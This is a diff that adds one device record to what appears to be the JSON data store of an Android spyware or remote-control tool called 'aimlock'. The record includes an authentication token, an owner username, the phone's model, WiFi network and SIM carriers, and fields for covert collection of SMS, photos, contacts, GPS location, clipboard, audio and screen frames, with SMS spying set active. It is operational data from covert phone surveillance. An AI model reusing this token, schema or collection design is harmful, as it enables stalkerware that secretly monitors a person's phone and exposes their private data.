@@ -21189,5 +21189,37 @@
       ],
       "receivedAt": 1775342097060
     }
+  },
+  {
+    "deviceId": "aimlock_b1b1e028",
+    "deviceName": "HP-REQ-5DAA",
+    "ownerUsername": "ardan",
+    "token": "3183356a7839b953b40d625bf68e5d54",
+    "lastSeen": 1775377807651,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-05T08:30:07.651Z",
+    "deviceInfo": {
+      "model": "INFINIX Infinix X6525",
+      "androidVersion": "Android 13",
+      "battery": 78,
+      "network": "WiFi: NAZURA.NET",
+      "sim1": "XL Axiata",
+      "sim2": "Indosat Ooredoo"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
